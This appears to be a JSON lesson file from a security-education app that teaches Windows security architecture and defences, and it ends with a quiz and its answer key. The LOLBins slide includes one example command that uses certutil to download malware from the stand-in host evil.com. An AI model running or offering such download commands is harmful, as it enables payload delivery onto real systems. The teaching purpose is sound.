@@ -1,0 +1,119 @@
+{
+    "id": "learn_windows_security",
+    "topicId": "windows_security",
+    "topicTitle": "Windows Security",
+    "description": "Core concepts of Windows security architecture: Authentication (NTLM/Kerberos), Active Directory, Permissions, and Defense mechanisms.",
+    "baseKP": 100,
+    "slides": [
+        {
+            "id": "windows_intro_1",
+            "type": "content",
+            "title": "The Windows Architecture",
+            "content": "# Windows Security Model 🪟\n\nThe most targeted OS in the world.\n\n## Core Components\n-   **SRM (Security Reference Monitor)**: The kernel module that checks permissions.\n-   **LSASS (Local Security Authority Subsystem Service)**: Handles logins, password changes, and access tokens.\n-   **SAM (Security Account Manager)**: Database storing local user passwords (hashed)."
+        },
+        {
+            "id": "windows_auth_1",
+            "type": "content",
+            "title": "Windows Authentication",
+            "content": "# Authentication Protocols 🔑\n\n## NTLM (New Technology LAN Manager)\n-   Challenge-Response protocol.\n-   **Vulnerable**: Susceptible to Pass-the-Hash and Relay attacks.\n-   Legacy but still present.\n\n## Kerberos\n-   Ticket-based protocol (The default in Domains).\n-   **Secure**: Uses timestamped tickets and mutual authentication.\n-   Requires a KDC (Key Distribution Center)."
+        },
+        {
+            "id": "active_directory_1",
+            "type": "content",
+            "title": "Active Directory (AD)",
+            "content": "# Active Directory 🌳\n\nThe directory service for Windows networks.\n\n## Structure\n-   **Domain**: A logical group of computers/users.\n-   **Forest**: A group of domains.\n-   **Domain Controller (DC)**: The server running AD DS.\n-   **Objects**: Users, Computers, Printers, GPOs."
+        },
+        {
+            "id": "ntlm_hash_1",
+            "type": "content",
+            "title": "NTLM Hashes",
+            "content": "# Storing Passwords 🔒\n\nWindows stores passwords as **NTLM Hashes**.\n`Hash = MD4(Unicode(Password))`\n\n## Weaknesss\n-   **Unsalted**: Same password = Same hash.\n-   **Fast**: MD4 is extremely fast to crack.\n-   **Stored**: In `%SystemRoot%\\System32\\config\\SAM` (local) or `NTDS.dit` (DC)."
+        },
+        {
+            "id": "windows_uac",
+            "type": "content",
+            "title": "User Account Control (UAC)",
+            "content": "# User Account Control 🛡️\n\n\"Do you want to allow this app to make changes?\"\n\n## Function\n-   Even Administrators run with a \"Standard Token\" by default.\n-   Elevation requires consent (Admin Approval Mode).\n-   Prevents malware from silently installing rootkits.\n\n> ⚠️ **Bypass**: There are many UAC bypass techniques (e.g., auto-elevating binaries)."
+        },
+        {
+            "id": "windows_perms_1",
+            "type": "content",
+            "title": "Windows Permissions (DACL)",
+            "content": "# Access Control Lists 📜\n\nPermissions are stored in the **DACL (Discretionary Access Control List)** of an object.\n\n## ACE (Access Control Entry)\n-   **SID**: Who? (S-1-5-21...)\n-   **Mask**: What? (Read, Write, Execute, Full Control)\n-   **Type**: Allow or Deny.\n\n**SACL (System ACL)** is used for Audit logging (monitoring access)."
+        },
+        {
+            "id": "perms_code",
+            "type": "content",
+            "title": "Viewing Permissions",
+            "content": "# Checking Configs 💻\n\n```powershell\n# Get ACL for a folder\nGet-Acl C:\\Windows | Format-List\n\n# ICACLS command\nicacls C:\\Windows\\System32\\cmd.exe\n```\n\n<!-- FULL_CODE_START\n# PowerShell simulation\nprint(\"=== Windows Permission Check Tool ===\")\n\ndef check_acl(path):\n    print(f\"[*] Analyzing ACL for: {path}\")\n    # Simulating icacls output\n    if path == \"C:\\\\Secret\":\n        print(\"  BUILTIN\\\\Administrators: (F) (Full Control)\")\n        print(\"  NT AUTHORITY\\\\SYSTEM: (F)\")\n        print(\"  Everyone: (R) (Read Only) [SAFE]\")\n    elif path == \"C:\\\\Public\":\n         print(\"  Everyone: (F) [CRITICAL RISK - World Writable]\")\n    else:\n        print(\"  [!] Path not found in simulation.\")\n\ncheck_acl(\"C:\\\\Secret\")\nprint(\"-\"*30)\ncheck_acl(\"C:\\\\Public\")\nFULL_CODE_END -->"
+        },
+        {
+            "id": "windows_defender_1",
+            "type": "content",
+            "title": "Windows Defender",
+            "content": "# Defender / Microsoft Defender Antivirus 🦠\n\nBuilt-in AV.\n\n## Features\n-   **Real-time Protection**: Scans files on access.\n-   **AMSI (Antimalware Scan Interface)**: Allows apps (PowerShell, .NET) to send content to the AV for scanning *in memory* (stopping file-less malware).\n-   **Tamper Protection**: Prevents malicious apps from disabling Defender via Registry."
+        },
+        {
+            "id": "gpo_1",
+            "type": "content",
+            "title": "Group Policy Objects (GPO)",
+            "content": "# Group Policy 👮\n\nCentralized management for the Domain.\n\n## Uses\n-   Enforce Password Complexity.\n-   Disable USB drives.\n-   Install software.\n-   **Risk**: If an attacker compromises a GPO editor, they can push malware to every PC in the domain immediately."
+        },
+        {
+            "id": "powershell_security",
+            "type": "content",
+            "title": "PowerShell Security",
+            "content": "# PowerShell: Friend & Foe 🐚\n\nPowerful shell, loved by Admins and Hackers.\n\n## Security Features\n-   **Execution Policy**: `Restricted`, `RemoteSigned` (Not a security boundary, just safety rails).\n-   **Script Block Logging**: Logs full content of executed scripts to Event Log (Event ID 4104).\n-   **Constrained Language Mode (CLM)**: Limits sensitive API access."
+        },
+        {
+            "id": "lolbins_1",
+            "type": "content",
+            "title": "LOLBins",
+            "content": "# Living Off The Land Binaries 🚜\n\nUsing built-in Windows tools to hack.\n\n## Examples\n-   **CertUtil**: Download files. `certutil -urlcache -split -f http://evil.com/malware`\n-   **Mshta**: Execute HTA scripts.\n-   **Regsvr32**: Execute malicious DLLs/SCTs.\n\n**Benefit**: Trusted signatures, often bypass Application Whitelisting."
+        },
+        {
+            "id": "sysinternals_1",
+            "type": "content",
+            "title": "Sysinternals Suite",
+            "content": "# Sysinternals 🧰\n\nMust-have tools for Windows monitoring (by Mark Russinovich).\n\n-   **Process Explorer**: Task Manager on steroids. See handles, DLLs, parent/child trees.\n-   **ProcMon**: Real-time File/Registry/Network activity. Great for debugging malware.\n-   **Autoruns**: Shows everything starting at boot (Persistence)."
+        },
+        {
+            "id": "smb_security",
+            "type": "content",
+            "title": "SMB Security",
+            "content": "# Server Message Block (SMB) 📂\n\nFile sharing protocol.\n\n## Risks\n-   **EternalBlue**: Exploit in SMBv1 (WannaCry).\n-   **SMB Signing**: If disabled, allows Relay attacks.\n-   **Null Session**: Listing shares/users without auth (mostly patched now).\n\n> 🛡️ **Fix**: Disable SMBv1. Enforce SMB Signing."
+        },
+        {
+            "id": "bitlocker_1",
+            "type": "content",
+            "title": "BitLocker",
+            "content": "# BitLocker Encryption 🔐\n\nFull Disk Encryption (FDE).\n\n-   Protects data if the laptop is stolen.\n-   Uses TPM (Trusted Platform Module) to store keys securely on the motherboard.\n-   **Cold Boot Attack**: Extracting keys from RAM if the machine is sleeping/on."
+        },
+        {
+            "id": "windows_firewall",
+            "type": "content",
+            "title": "Windows Firewall",
+            "content": "# Host Firewall 🧱\n\n-   **Profiles**: Domain, Private, Public.\n-   **Rules**: Block Inbound (Default), Allow Outbound (Default).\n-   **Recommendation**: Restrict Outbound traffic (Egress Filtering) to catch C2 beacons."
+        },
+        {
+            "id": "defender_quiz",
+            "type": "quiz",
+            "title": "Defender Quiz",
+            "content": "Check your AV knowledge.",
+            "quizQuestion": "What interface allows PowerShell to send executed scripts to the Antivirus for scanning?",
+            "quizOptions": [
+                "ASLR",
+                "AMSI (Antimalware Scan Interface)",
+                "UAC",
+                "DEP"
+            ],
+            "correctOptionIndex": 1
+        },
+        {
+            "id": "windows_summary",
+            "type": "content",
+            "title": "Module Summary",
+            "content": "# Wrap Up 🎁\n\n-   **Auth**: Kerberos > NTLM.\n-   **AD**: The heart of the enterprise network.\n-   **Permission**: ACLs control access.\n-   **Logging**: Enable Script Block Logging and Command Line Auditing.\n-   **Hardening**: Disable LOLBins and outdated protocols (SMBv1)."
+        }
+    ]
+}
